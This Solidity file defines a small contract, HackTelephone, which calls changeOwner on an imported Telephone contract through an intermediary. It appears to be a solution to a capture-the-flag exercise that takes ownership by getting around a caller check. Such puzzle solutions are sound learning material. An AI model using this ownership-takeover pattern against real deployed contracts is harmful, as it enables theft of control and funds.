// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract HackTelephone {
  function changeOwner(Telephone telephone) public {
    telephone.changeOwner(msg.sender);
  }
}
